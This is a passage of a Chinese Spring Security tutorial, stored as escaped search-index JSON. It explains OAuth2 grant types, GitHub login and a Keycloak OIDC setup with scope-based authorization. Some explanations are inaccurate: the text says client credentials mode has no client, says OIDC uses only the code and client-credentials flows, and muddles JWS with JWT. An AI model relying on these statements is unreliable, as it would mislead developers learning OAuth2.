RFC 6749 \u4e2d\u3002 \u7b80\u5355\u6765\u8bf4\uff0cOAuth2 \u4e2d\u6709\u56db\u4e2a\u89d2\u8272\uff1a \u8d44\u6e90\u62e5\u6709\u8005\uff08Resource Owner\uff09\uff1a\u7528\u6237 \u5ba2\u6237\u7aef\uff08Client\uff09\uff1a\u7b2c\u4e09\u65b9\u5e94\u7528 \u6388\u6743\u670d\u52a1\u5668\uff08Authorization Server\uff09\uff1a\u7528\u4e8e\u8ba4\u8bc1\u7528\u6237\u5e76\u6388\u6743\u5ba2\u6237\u7aef\u8bbf\u95ee\u8d44\u6e90\u7684\u670d\u52a1\u5668 \u8d44\u6e90\u670d\u52a1\u5668\uff08Resource Server\uff09\uff1a\u5b58\u50a8\u8d44\u6e90\u7684\u670d\u52a1\u5668 \u5f53\u7136\uff0c\u53ef\u4ee5\u6388\u6743\u670d\u52a1\u5668\u548c\u8d44\u6e90\u670d\u52a1\u5668\u53ef\u4ee5\u662f\u540c\u4e00\u4e2a\u670d\u52a1\u5668\uff0c\u8fd9\u6837\u5c31\u662f\u4e00\u4e2a\u5355\u4f53\u5e94\u7528\u3002\u5982\u679c\u4e0d\u5728\u540c\u4e00\u4e2a\u670d\u52a1\u5668\u4e0a\uff0c\u5c31\u662f\u5fae\u670d\u52a1\u67b6\u6784\u3002\u73b0\u5728\u5f88\u591a\u7f51\u7ad9\u90fd\u63d0\u4f9b\u4e86 OAuth2 \u7684\u6388\u6743\u670d\u52a1\uff0c\u4f8b\u5982 GitHub\uff0cGoogle\u3002\u56fd\u5185\u7684 Gitee \u4e5f\u63d0\u4f9b\u4e86 OAuth2 \u7684\u6388\u6743\u670d\u52a1\u3002 OAuth2 \u4e2d\u6709\u56db\u79cd\u6388\u6743\u65b9\u5f0f\uff1a \u6388\u6743\u7801\u6a21\u5f0f\uff08Authorization Code\uff09\uff1a\u5177\u4f53\u6d41\u7a0b\u4e3a\uff0c\u5ba2\u6237\u7aef\u91cd\u5b9a\u5411\u5230\u6388\u6743\u670d\u52a1\u5668\uff0c\u7528\u6237\u767b\u5f55\u5e76\u6388\u6743\uff0c\u6388\u6743\u670d\u52a1\u5668\u91cd\u5b9a\u5411\u5230\u5ba2\u6237\u7aef\uff0c\u5e76\u63d0\u4f9b\u6388\u6743\u7801\uff0c\u5ba2\u6237\u7aef\u4f7f\u7528\u6388\u6743\u7801\u83b7\u53d6 Token\uff0c\u518d\u4f7f\u7528 Token \u83b7\u53d6\u8d44\u6e90\u3002 \u7b80\u5316\u6a21\u5f0f\uff08Implicit\uff09\uff1a\u5177\u4f53\u6d41\u7a0b\u4e3a\uff0c\u5ba2\u6237\u7aef\u91cd\u5b9a\u5411\u5230\u6388\u6743\u670d\u52a1\u5668\uff0c\u7528\u6237\u767b\u5f55\u5e76\u6388\u6743\uff0c\u6388\u6743\u670d\u52a1\u5668\u91cd\u5b9a\u5411\u5230\u5ba2\u6237\u7aef\uff0c\u5ba2\u6237\u7aef\u76f4\u63a5\u83b7\u53d6 Token\uff0c\u518d\u4f7f\u7528 Token \u83b7\u53d6\u8d44\u6e90\u3002 \u5bc6\u7801\u6a21\u5f0f\uff08Resource Owner Password Credentials\uff09\uff1a\u9002\u7528\u4e8e\u53d7\u4fe1\u4efb\u7684\u5ba2\u6237\u7aef\u3002\u5ba2\u6237\u7aef\u76f4\u63a5\u4f7f\u7528\u7528\u6237\u540d\u548c\u5bc6\u7801\u83b7\u53d6 Token\uff0c\u518d\u4f7f\u7528 Token \u83b7\u53d6\u8d44\u6e90\u3002 \u5ba2\u6237\u7aef\u6a21\u5f0f\uff08Client Credentials\uff09\uff1a\u5ba2\u6237\u7aef\u76f4\u63a5\u4f7f\u7528\u5ba2\u6237\u7aef ID \u548c\u5ba2\u6237\u7aef\u5bc6\u7801\u83b7\u53d6 Token\uff0c\u518d\u4f7f\u7528 Token \u83b7\u53d6\u8d44\u6e90\u3002 \u6ce8\u610f\uff0c\u524d\u4e09\u79cd\u6a21\u5f0f\u90fd\u6709\u5ba2\u6237\u7aef\u7684\u53c2\u4e0e\uff0c\u6700\u540e\u4e00\u79cd\u6a21\u5f0f\u6ca1\u6709\u5ba2\u6237\u7aef\u7684\u53c2\u4e0e\uff0c\u5373\u6388\u6743\u670d\u52a1\u5668\u7b7e\u53d1\u4e00\u4e2a\u56fa\u5b9a\u7684 secret\uff0c\u8fd9\u4e2a secret \u53ef\u4ee5\u76f4\u63a5\u7528\u6765\u83b7\u53d6 token\uff0c\u56e0\u6b64\u662f\u7528\u4e8e\u670d\u52a1\u5bf9\u670d\u52a1\u7684\u901a\u4fe1\u3002\u800c\u524d\u4e09\u79cd\u90fd\u662f\u5ba2\u6237\u7aef\u548c\u7528\u6237\u7684\u901a\u4fe1\u3002 \u5728 OAuth2 \u4e2d\uff0c\u9a8c\u8bc1\u4f7f\u7528\u7684 Token \u901a\u5e38\u662f JWT\u3002\u4e0d\u8fc7 JWS\uff0c\u5373 JSON Web Signature\uff0c\u4e5f\u662f\u4e00\u79cd\u5e38\u7528\u7684 Token \u683c\u5f0f\u3002 OIDC OIDC\uff0c\u5373 OpenID Connect\uff0c\u662f OAuth2 \u7684\u4e00\u4e2a\u6269\u5c55\u3002OIDC \u4e3a OAuth2 \u6dfb\u52a0\u4e86\u7528\u6237\u4fe1\u606f\u7684\u83b7\u53d6\u3002OIDC \u4e3a OAuth2 \u6dfb\u52a0\u4e86\u4e00\u4e2a ID Token\uff0c\u7528\u4e8e\u83b7\u53d6\u7528\u6237\u4fe1\u606f\u3002OIDC \u7684\u6587\u6863\u5728 OIDC \u4e2d\u3002 OIDC \u4e0e OAuth2 \u7684\u4e3b\u8981\u533a\u522b\u6709\uff0c OIDC \u53ea\u4f7f\u7528\u6388\u6743\u7801\u6a21\u5f0f\u548c\u5ba2\u6237\u7aef\u6a21\u5f0f\u3002 OIDC \u6dfb\u52a0\u4e86\u7528\u6237\u4fe1\u606f\u7684 scope\uff0c\u7528\u4e8e\u83b7\u53d6\u7528\u6237\u4fe1\u606f\u3002 OIDC \u8fd8\u80fd\u751f\u4ea7\u7528\u6237\u4ee4\u724c\uff0c\u7528\u4e8e\u7528\u6237\u8ba4\u8bc1\u3002 Spring Security OAuth2 \u6388\u6743\u7801\u6a21\u5f0f\u767b\u9646 \u9996\u5148\u6211\u4eec\u4ecb\u7ecd\u5982\u4f55\u5728 Spring Security \u4e2d\u914d\u7f6e OAuth2 \u5ba2\u6237\u7aef\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u4f1a\u4f7f\u7528 GitHub \u4f5c\u4e3a\u6388\u6743\u670d\u52a1\u5668\u3002\u7531\u4e8e\u5728\u540e\u7aef\u5f00\u53d1\u4e2d\uff0c\u51e0\u4e4e\u53ea\u4f1a\u7528\u5230\u6388\u6743\u7801\u6a21\u5f0f\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u4ecb\u7ecd\u8fd9\u4e00\u79cd\u6a21\u5f0f\u3002 \u9996\u5148\uff0c\u52a0\u5165\u4f9d\u8d56\uff0c implementation 'org.springframework.boot:spring-boot-starter-oauth2-client' \u7136\u540e\u5220\u9664\u5176\u5b83\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u6dfb\u52a0 OAuth2 \u767b\u9646\uff0c @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http ) { SecurityWebFilterChain chain = http .httpBasic(basic -> basic.disable()) .formLogin(form -> form.disable()) .logout(logout -> logout.disable()) .oauth2Login(Customizer.withDefaults()) // .addFilterBefore(filter, SecurityWebFiltersOrder.AUTHENTICATION) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").permitAll() .pathMatchers(\"/resource/private\").authenticated() .pathMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyExchange().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .securityContextRepository( NoOpServerSecurityContextRepository.getInstance() ) .build(); return chain; } \u4f7f\u7528 GitHub \u7684\u6388\u6743\u670d\u52a1\u5668\uff0c\u9700\u8981\u5411 GitHub \u7533\u8bf7\u4e00\u4e2a OAuth2 \u5e94\u7528\uff0c\u83b7\u53d6 Client ID \u548c Client Secret\u3002\u7533\u8bf7\u5730\u5740\u5728 \u6b64\u5904 \uff0ccallback URL \u5fc5\u987b\u586b\u5199 {baseUrl}/login/oauth2/code/{registrationId} \uff0c\u73b0\u5728\u5373 http://localhost:8080/login/oauth2/code/github \u3002\u8fd9\u4e2a URL \u662f\u6388\u6743\u670d\u52a1\u5668\u91cd\u5b9a\u5411\u5230\u5ba2\u6237\u7aef\u7684 URL\uff0c\u5373\u63a5\u6536\u6388\u6743\u7801\u7684 URL\uff1bhomepage URL \u586b\u5199 http://localhost:8080 \uff0c\u8fd9\u4e2a URL \u53ea\u662f\u7528\u4e8e homepage \u68c0\u67e5\uff0c\u4f8b\u5982\u63d0\u4f9b\u7ed9 GitHub \u67e5\u770b\u662f\u5426\u5c5e\u4e8e GitHub \u8ba4\u8bc1\u7684\u5e94\u7528\u7b49\u3002\u5982\u679c\u4fee\u6539\u4e86\u7aef\u53e3\u8981\u4e00\u5e76\u4fee\u6539\u3002 \u7136\u540e\u5728 application.yml \u4e2d\u914d\u7f6e\uff0c spring: security: oauth2: client: registration: github: clientId: ${clientId} clientSecret: ${clientSecret} \u4e4b\u540e\u518d\u8bbf\u95ee http://localhost:8080/resource/private \uff0c\u4f1a\u91cd\u5b9a\u5411\u5230 GitHub \u767b\u9646\u9875\u9762\u3002\u6388\u6743\u767b\u9646\u540e\uff0c\u4f1a\u91cd\u5b9a\u5411\u5230 http://localhost:8080/login/oauth2/code/github \uff0c\u7136\u540e\u518d\u91cd\u5b9a\u5411\u5230 http://localhost:8080/resource/private \uff0c\u5e76\u8fd4\u56de\u8d44\u6e90\u3002 \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u5b9e\u73b0\u4e86 OAuth2 \u6388\u6743\u7801\u6a21\u5f0f\u7684\u5ba2\u6237\u7aef\u3002\u4e4b\u524d URL \u4e2d\u7684 code \u4e5f\u5c31\u4ee3\u8868\u4e86\u6388\u6743\u7801\u6a21\u5f0f\u3002\u5927\u90e8\u5206\u7684\u64cd\u4f5c\u90fd\u5df2\u7ecf\u88ab\u5904\u7406\u597d\u4e86\uff0c\u4e0d\u5fc5\u6211\u4eec\u8fc7\u591a\u5173\u6ce8\u3002 \u521b\u5efa OIDC \u6388\u6743\u670d\u52a1\u5668 \u6388\u6743\u670d\u52a1\u5668\u6709\u8bb8\u591a\u9009\u62e9\uff0c\u53ef\u4ee5\u7528 SaaS\uff0c\u4f8b\u5982 Auth0\uff0c\u4e5f\u53ef\u4ee5\u81ea\u5df1\u642d\u5efa\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 KeyClock\u3002\u5176 Docker \u955c\u50cf\u5728 \u6b64\u5904 \u3002 services: keyclock: image: keycloak/keycloak environment: - KEYCLOAK_ADMIN=admin - KEYCLOAK_ADMIN_PASSWORD=pwd ports: - 8080:8080 command: start-dev \u542f\u52a8\u540e\uff0c\u9996\u5148\u5728\u5de6\u4e0a\u89d2\u70b9\u51fb\u4e0b\u62c9\u6846\uff0c\u521b\u5efa\u4e00\u4e2a Realm\uff0c\u4e00\u4e2a Realm \u5373\u4e00\u4e2a\u72ec\u7acb\u7684\u6388\u6743\u670d\u52a1\u5668\u3002\u7136\u540e\u5728\u5de6\u4fa7\u9009\u62e9 Clients\uff0c\u521b\u5efa\u4e00\u4e2a Client\uff0cClient ID \u5373\u5ba2\u6237\u7aef ID\uff0cClient Secret \u5373\u5ba2\u6237\u7aef\u5bc6\u7801\u3002\u7136\u540e\u5728\u5de6\u4fa7\u9009\u62e9 Users\uff0c\u521b\u5efa\u4e00\u4e2a\u7528\u6237\uff0c\u7528\u6237\u540d\u548c\u5bc6\u7801\u5373\u4e3a\u7528\u6237\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002 \u7136\u540e\u5728\u5de6\u4fa7 clients \u91cc\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 Client\u3002 \u540d\u5b57\u4efb\u610f\uff0c\u5176\u5b83\u4fe1\u606f\u9ed8\u8ba4\u5373\u53ef\u3002 \u7136\u540e\uff0c\u5c06 Access Settings \u4e2d Root URL \u8bbe\u7f6e\u597d\u3002\u76ee\u524d\u53ef\u4ee5\u968f\u610f\u8bbe\u7f6e\uff0c\u4f46\u662f\u4e4b\u540e\u7684 Callback URL \u5fc5\u987b\u4e0e\u8fd9\u4e2a Root URL \u6709\u4e00\u6837\u7684\u6839\u57df\u540d\u3002 \u7136\u540e\u5728\u5de6\u4fa7 Users \u91cc\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7528\u6237\u3002\u518d\u70b9\u8fdb\u65b0\u521b\u5efa\u7684\u7528\u6237\uff0c\u9009\u62e9 Credential \u754c\u9762\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u5bc6\u7801\u3002 \u518d\u8fdb\u5165\u5de6\u4fa7 Realm Settings\uff0c\u5728\u6700\u4e0b\u65b9\u627e\u5230 Endpoint\uff0c\u70b9\u8fdb\u53bb\u540e\u4f1a\u770b\u5230\u4e00\u4e2a json \u5bf9\u8c61\uff0c\u50cf\u4e0b\u9762\u8fd9\u6837\uff0c {\"issuer\":\"http://localhost:8080/realms/demo\",\"authorization_endpoint\":\"http://localhost:8080/realms/demo/protocol/openid-connect/auth\",\"token_endpoint\":\"http://localhost:8080/realms/demo/protocol/openid-connect/token\",\"introspection_endpoint\":\"http://localhost:8080/realms/demo/protocol/openid-connect/token/introspect\",\"userinfo_endpoint\":\"http://localhost:8080/realms/demo/protocol/openid-connect/userinfo\",\"end_session_endpoint\":\"http://localhost:8080/realms/demo/protocol/openid-connect/logout\",\"frontchannel_logout_session_supported\":true,\"frontchannel_logout_supported\":true,\"jwks_uri\":\"http://localhost:8080/realms/demo/protocol/openid-connect/certs\",\"check_session_iframe\": ...} \u8fd9\u91cc\u7684 authorization_endpoint \u5c31\u662f\u6388\u6743\u670d\u52a1\u5668\u7684\u5730\u5740\uff0c token_endpoint \u5c31\u662f\u83b7\u53d6 Token \u7684\u5730\u5740\u3002\u4e0b\u9762\u6211\u4eec\u4f1a\u7528\u5230\u7684\u76f8\u5173\u4fe1\u606f\u90fd\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230\u3002 \u73b0\u5728\uff0c\u6211\u4eec\u5c31\u5df2\u7ecf\u53ef\u4ee5\u7528\u4e0a\u9762\u4ecb\u7ecd\u7684\u65b9\u5f0f\u8bf7\u6c42\u6388\u6743\u670d\u52a1\u5668\u4e86\u3002\u4e0a\u9762\u7684 Json \u4e2d\u5df2\u7ecf\u7ed9\u51fa\u4e86\u6388\u6743\u670d\u52a1\u5668\u7684\u5730\u5740\uff0c\u548c token \u7684\u83b7\u53d6\u5730\u5740\u3002 \u8981\u6dfb\u52a0\u6216\u5220\u9664\u7528\u6237\u7b49\u64cd\u4f5c\uff0c\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528 KeyClock \u7684 REST API \u6765\u5b9e\u73b0\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002 \u4f7f\u7528 OIDC \u6388\u6743\u670d\u52a1\u5668 \u73b0\u5728\u5728 Spring \u9879\u76ee\u4e2d\uff0c\u53ea\u9700\u8981\u5c06\u4e4b\u524d\u7684 Client \u6362\u6389\u5373\u53ef\u3002\u5728 application.yml \u4e2d\u914d\u7f6e\uff0c spring: security: oauth2: client: registration: keycloak: clientId: ${clientId} clientSecret: ${clientSecret} clientName: keycloak provider: keycloak redirectUri: \"{baseUrl}/login/oauth2/code/{registrationId}\" authorizationGrantType: authorization_code scope: openid provider: keycloak: authorizationUri: http://localhost:8080/realms/demo/protocol/openid-connect/auth tokenUri: http://localhost:8080/realms/demo/protocol/openid-connect/token jwkSetUri: http://localhost:8080/realms/demo/protocol/openid-connect/certs userInfoUri: http://localhost:8080/realms/demo/protocol/openid-connect/userinfo userNameAttribute: preferred_username \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684 client \u5b57\u6bb5\u4e4b\u524d\u5df2\u7ecf\u4ecb\u7ecd\u8fc7\u3002\u8fd9\u91cc\u7684 provider \u662f\u63d0\u4f9b\u7528\u6237\u4fe1\u606f\u7684\u5730\u5740\uff0c jwkSetUri \u662f\u63d0\u4f9b JWT \u7684\u5730\u5740\uff0c userInfoUri \u662f\u63d0\u4f9b\u7528\u6237\u4fe1\u606f\u7684\u5730\u5740\uff0c userNameAttribute \u662f\u7528\u6237\u4fe1\u606f\u4e2d\u7684\u7528\u6237\u540d\u5b57\u6bb5\u3002\u8fd9\u4e9b\u5b57\u6bb5\u90fd\u53ef\u4ee5\u5728\u4e0a\u9762\u7684 Endpoint \u4e2d\u627e\u5230\u3002\u6b64\u5916\uff0c\u5c3d\u7ba1\u6211\u4eec\u7684 scope \u662f\u7528\u7684\u9ed8\u8ba4\u7684\uff0c\u4f46\u4e0d\u80fd\u7701\u7565\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002 \u76ee\u524d\uff0c\u6211\u4eec\u8fd8\u6ca1\u7ed9\u7528\u6237\u63d0\u4f9b\u591a\u4f59\u7684\u4fe1\u606f\u3002\u73b0\u5728\u5728 KeyCloak \u7684 Client Scope \u91cc\uff0c\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 Scope\uff0c\u6253\u5f00 include in token scope\u3002\u8fd9\u6837\u4f1a\u5728\u8ba4\u8bc1\u65f6\u5c31\u53ef\u4ee5\u540c\u65f6\u5728 JWT \u91cc\u8fd4\u56de\u8fd9\u6761\u4fe1\u606f\u3002 \u7136\u540e\uff0c\u4e3a\u5b83\u521b\u5efa\u4e00\u4e2a Mapper\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9 User Attribute\u3002\u8fd9\u91cc\u6211\u4eec\u6240\u6709\u7684 key \u7edf\u4e00\u7528 is_admin \u3002\u8fd9\u6837\uff0cJWT \u4e2d is_admin \u7684\u503c\u4f1a\u88ab\u6620\u5c04\u5230\u7528\u6237\u7684 is_admin \u5c5e\u6027\u3002\u8fd9\u91cc\u7684\u903b\u8f91\u662f\uff0cJWT \u4e2d Claim \u540d\u4e3a Token Claim Name \u7684\u4f1a\u88ab\u6620\u5c04\u5230\u7528\u6237\u7684 User Attribute Name\u3002 \u8981\u7ed9\u7528\u6237\u8bbe\u5b9a Attribute\uff0c\u9700\u8981\u628a\u7528\u6237\u52a0\u5165\u7ec4\u4e2d\uff0c\u7136\u540e\u5728\u7ec4\u91cc\u8bbe\u7f6e Scope \u7684\u503c\u3002\u8fd9\u6837\u7528\u6237\u5c31\u4f1a\u6709\u8fd9\u4e2a Scope \u7684\u503c\u4e86\u3002 \u7136\u540e\u5728 Members \u91cc\uff0c\u628a admin \u52a0\u8fdb\u53bb\u3002 \u6700\u540e\uff0c\u5728 Client \u91cc\uff0c\u5c06\u8fd9\u4e2a Scope \u52a0\u8fdb\u53bb\u3002 \u8fd9\u91cc\u5982\u679c\u8bbe\u7f6e\u7684 Default\uff0c\u8bf7\u6c42\u65f6\u5c31\u4f1a\u81ea\u52a8\u52a0\u4e0a\u8fd9\u4e2a Scope\u3002\u5982\u679c\u8bbe\u7f6e\u7684 Optional\uff0c\u8bf7\u6c42\u65f6\u4f1a\u6839\u636e Scope \u53c2\u6570\u6765\u51b3\u5b9a\u662f\u5426\u52a0\u4e0a\u8fd9\u4e2a Scope\u3002 \u73b0\u5728\u8fdb\u5165\u5230 Client Scope \u7684 Evaluate \u754c\u9762\uff0c\u53ef\u4ee5\u770b\u5230 token \u91cc\u5df2\u7ecf\u80fd\u6b63\u786e\u8fd4\u56de is_admin \u4e86\u3002 \u73b0\u5728\uff0c\u4fee\u6539\u4e00\u4e0b FilterChain \u5373\u53ef\u3002Spring Security \u81ea\u52a8\u628a Authorities \u8bbe\u7f6e\u4e3a SCOPE_{name} \uff0c\u8fd9\u6837\u53ef\u4ee5\u901a\u8fc7\u5224\u65ad\u67d0\u4e2a Scope \u662f\u5426\u5b58\u5728\u6765\u5224\u65ad\u7528\u6237\u662f\u5426\u6709\u6743\u9650\u3002 @Configuration @EnableWebFluxSecurity public class SecurityConfig { @Bean SecurityWebFilterChain springSecurityFilterChain(ServerHttpSecurity http) { http .oauth2Login(Customizer.withDefaults()) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").permitAll() .pathMatchers(\"/resource/private\").authenticated() .pathMatchers(\"/resource/admin\").hasAnyAuthority(\"SCOPE_is_admin\") .anyExchange().permitAll() ); return http.build(); } } \u73b0\u5728\uff0c\u5c31\u80fd\u901a\u8fc7 /resource/admin \u6765\u8bbf\u95ee\u9700\u8981 is_admin Scope \u7684\u8d44\u6e90\u4e86\u3002","title":"Spring Security OAuth2 \u8ba4\u8bc1\u4ee5\u53ca KeyCloak \u7528\u6237\u670d\u52a1"},{"location":"15/#spring-ch15-spring-security-keycloak","text":"\u4e0a\u6b21\u4ecb\u7ecd\u4e86\u5355\u4f53\u5e94\u7528\u4f7f\u7528 Spring Security \u7684\u57fa\u672c\u914d\u7f6e\uff0c\u8fd9\u6b21\u8bb2\u89e3 OAuth2 \u6846\u67b6\u7684\u4f7f\u7528\u3002 OAuth2 \u53ea\u662f\u4e00\u5957\u6388\u6743\u6846\u67b6\uff0c\u4e0d\u5305\u542b\u8ba4\u8bc1\u529f\u80fd\u3002Spring Security \u4e3a OAuth2 \u63d0\u4f9b\u4e86\u652f\u6301\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u5b9e\u73b0 OAuth2 \u7684\u8ba4\u8bc1\u4e0e\u9274\u6743\u3002\u5176\u5b83\u8bed\u8a00\u4e5f\u6709 OAuth2 \u6846\u67b6\u3002\u4f8b\u5982\uff0cPython \u6709 authlib \uff0cGo \u6709 golang.org/x/oauth2 \u3002 \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 KeyCloak \u4f5c\u4e3a\u6388\u6743\u670d\u52a1\u5668\uff0cKeyCloak \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u89e3\u51b3\u65b9\u6848\u3002KeyCloak \u4e3a OAuth2 \u548c OIDC \u63d0\u4f9b\u4e86\u652f\u6301\u3002OIDC \u662f OAuth2 \u7684\u4e00\u4e2a\u6269\u5c55\uff0c\u4e3a OAuth2 \u6dfb\u52a0\u4e86\u7528\u6237\u4fe1\u606f\u7684\u83b7\u53d6\uff0c\u5e76\u589e\u5f3a\u4e86\u5b89\u5168\u6027\u3002","title":"Spring \u901f\u6210 Ch15 Spring Security \u4e0e KeyCloak"},{"location":"15/#oauth2","text":"OAuth2 \u662f\u4e00\u4e2a\u5f00\u653e\u6807\u51c6\uff0c\u5141\u8bb8\u7528\u6237\u6388\u6743\u7b2c\u4e09\u65b9\u5e94\u7528\u8bbf\u95ee\u4ed6\u4eec\u5b58\u50a8\u5728\u53e6\u5916\u7684\u670d\u52a1\u63d0\u4f9b\u8005\u4e0a\u7684\u4fe1\u606f\uff0c\u800c\u4e0d\u9700\u8981\u5c06\u7528\u6237\u540d\u548c\u5bc6\u7801\u63d0\u4f9b\u7ed9\u7b2c\u4e09\u65b9\u5e94\u7528\u3002OAuth2 \u4e3a\u7528\u6237\u8d44\u6e90\u7684\u6388\u6743\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5b89\u5168\u7684\u3001\u5f00\u653e\u548c\u7b80\u5355\u7684\u6807\u51c6\u3002\u8fd9\u4e2a\u6807\u51c6\u7684\u6587\u6863\u5728 RFC 6749 \u4e2d\u3002 \u7b80\u5355\u6765\u8bf4\uff0cOAuth2 \u4e2d\u6709\u56db\u4e2a\u89d2\u8272\uff1a \u8d44\u6e90\u62e5\u6709\u8005\uff08Resource Owner\uff09\uff1a\u7528\u6237 \u5ba2\u6237\u7aef\uff08Client\uff09\uff1a\u7b2c\u4e09\u65b9\u5e94\u7528 \u6388\u6743\u670d\u52a1\u5668\uff08Authorization Server\uff09\uff1a\u7528\u4e8e\u8ba4\u8bc1\u7528\u6237\u5e76\u6388\u6743\u5ba2\u6237\u7aef\u8bbf\u95ee\u8d44\u6e90\u7684\u670d\u52a1\u5668 \u8d44\u6e90\u670d\u52a1\u5668\uff08Resource Server\uff09\uff1a\u5b58\u50a8\u8d44\u6e90\u7684\u670d\u52a1\u5668 \u5f53\u7136\uff0c\u53ef\u4ee5\u6388\u6743\u670d\u52a1\u5668\u548c\u8d44\u6e90\u670d\u52a1\u5668\u53ef\u4ee5\u662f\u540c\u4e00\u4e2a\u670d\u52a1\u5668\uff0c\u8fd9\u6837\u5c31\u662f\u4e00\u4e2a\u5355\u4f53\u5e94\u7528\u3002\u5982\u679c\u4e0d\u5728\u540c\u4e00\u4e2a\u670d\u52a1\u5668\u4e0a\uff0c\u5c31\u662f\u5fae\u670d\u52a1\u67b6\u6784\u3002\u73b0\u5728\u5f88\u591a\u7f51\u7ad9\u90fd\u63d0\u4f9b\u4e86 OAuth2 \u7684\u6388\u6743\u670d\u52a1\uff0c\u4f8b\u5982 GitHub\uff0cGoogle\u3002\u56fd\u5185\u7684 Gitee \u4e5f\u63d0\u4f9b\u4e86 OAuth2 \u7684\u6388\u6743\u670d\u52a1\u3002 OAuth2 \u4e2d\u6709\u56db\u79cd\u6388\u6743\u65b9\u5f0f\uff1a \u6388\u6743\u7801\u6a21\u5f0f\uff08Authorization Code\uff09\uff1a\u5177\u4f53\u6d41\u7a0b\u4e3a\uff0c\u5ba2\u6237\u7aef\u91cd\u5b9a\u5411\u5230\u6388\u6743\u670d\u52a1\u5668\uff0c\u7528\u6237\u767b\u5f55\u5e76\u6388\u6743\uff0c\u6388\u6743\u670d\u52a1\u5668\u91cd\u5b9a\u5411\u5230\u5ba2\u6237\u7aef\uff0c\u5e76\u63d0\u4f9b\u6388\u6743\u7801\uff0c\u5ba2\u6237\u7aef\u4f7f\u7528\u6388\u6743\u7801\u83b7\u53d6 Token\uff0c\u518d\u4f7f\u7528 Token \u83b7\u53d6\u8d44\u6e90\u3002 \u7b80\u5316\u6a21\u5f0f\uff08Implicit\uff09\uff1a\u5177\u4f53\u6d41\u7a0b\u4e3a\uff0c\u5ba2\u6237\u7aef\u91cd\u5b9a\u5411\u5230\u6388\u6743\u670d\u52a1\u5668\uff0c\u7528\u6237\u767b\u5f55\u5e76\u6388\u6743\uff0c\u6388\u6743\u670d\u52a1\u5668\u91cd\u5b9a\u5411\u5230\u5ba2\u6237\u7aef\uff0c\u5ba2\u6237\u7aef\u76f4\u63a5\u83b7\u53d6 Token\uff0c\u518d\u4f7f\u7528 Token \u83b7\u53d6\u8d44\u6e90\u3002 \u5bc6\u7801\u6a21\u5f0f\uff08Resource Owner Password Credentials\uff09\uff1a\u9002\u7528\u4e8e\u53d7\u4fe1\u4efb\u7684\u5ba2\u6237\u7aef\u3002\u5ba2\u6237\u7aef\u76f4\u63a5\u4f7f\u7528\u7528\u6237\u540d\u548c\u5bc6\u7801\u83b7\u53d6 Token\uff0c\u518d\u4f7f\u7528 Token \u83b7\u53d6\u8d44\u6e90\u3002 \u5ba2\u6237\u7aef\u6a21\u5f0f\uff08Client Credentials\uff09\uff1a\u5ba2\u6237\u7aef\u76f4\u63a5\u4f7f\u7528\u5ba2\u6237\u7aef ID \u548c\u5ba2\u6237\u7aef\u5bc6\u7801\u83b7\u53d6 Token\uff0c\u518d\u4f7f\u7528 Token \u83b7\u53d6\u8d44\u6e90\u3002 \u6ce8\u610f\uff0c\u524d\u4e09\u79cd\u6a21\u5f0f\u90fd\u6709\u5ba2\u6237\u7aef\u7684\u53c2\u4e0e\uff0c\u6700\u540e\u4e00\u79cd\u6a21\u5f0f\u6ca1\u6709\u5ba2\u6237\u7aef\u7684\u53c2\u4e0e\uff0c\u5373\u6388\u6743\u670d\u52a1\u5668\u7b7e\u53d1\u4e00\u4e2a\u56fa\u5b9a\u7684 secret\uff0c\u8fd9\u4e2a secret \u53ef\u4ee5\u76f4\u63a5\u7528\u6765\u83b7\u53d6 token\uff0c\u56e0\u6b64\u662f\u7528\u4e8e\u670d\u52a1\u5bf9\u670d\u52a1\u7684\u901a\u4fe1\u3002\u800c\u524d\u4e09\u79cd\u90fd\u662f\u5ba2\u6237\u7aef\u548c\u7528\u6237\u7684\u901a\u4fe1\u3002 \u5728 OAuth2 \u4e2d\uff0c\u9a8c\u8bc1\u4f7f\u7528\u7684 Token \u901a\u5e38\u662f JWT\u3002\u4e0d\u8fc7 JWS\uff0c\u5373 JSON Web Signature\uff0c\u4e5f\u662f\u4e00\u79cd\u5e38\u7528\u7684 Token \u683c\u5f0f\u3002","title":"OAuth2"},{"location":"15/#oidc","text":"OIDC\uff0c\u5373 OpenID Connect\uff0c\u662f OAuth2 \u7684\u4e00\u4e2a\u6269\u5c55\u3002OIDC \u4e3a OAuth2 \u6dfb\u52a0\u4e86\u7528\u6237\u4fe1\u606f\u7684\u83b7\u53d6\u3002OIDC \u4e3a OAuth2 \u6dfb\u52a0\u4e86\u4e00\u4e2a ID Token\uff0c\u7528\u4e8e\u83b7\u53d6\u7528\u6237\u4fe1\u606f\u3002OIDC \u7684\u6587\u6863\u5728 OIDC \u4e2d\u3002 OIDC \u4e0e OAuth2 \u7684\u4e3b\u8981\u533a\u522b\u6709\uff0c OIDC \u53ea\u4f7f\u7528\u6388\u6743\u7801\u6a21\u5f0f\u548c\u5ba2\u6237\u7aef\u6a21\u5f0f\u3002 OIDC \u6dfb\u52a0\u4e86\u7528\u6237\u4fe1\u606f\u7684 